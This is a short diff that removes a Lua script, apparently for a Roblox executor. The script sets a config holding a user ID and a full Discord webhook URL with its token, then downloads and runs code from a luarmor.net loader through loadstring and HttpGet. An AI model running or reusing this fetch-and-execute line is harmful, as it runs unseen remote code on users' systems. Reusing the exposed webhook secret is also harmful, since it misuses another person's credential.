@@ -1,6 +1,0 @@
-getgenv().Config = {
-    ["EquipEnchants"] = {},
-    ["UserID"] = "807267031929716776",
-    ["Webhook"] = "https://discord.com/api/webhooks/1289518389911490601/2ZTyB52X6jKr7B5M4LxM0QWy4Md5EDvWSBzVK7CCF1ixqc6TPgvIiWWoPqtT0ia0dM7s"
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b883bc159a5f609adb4871db6fc15ea8.lua"))()
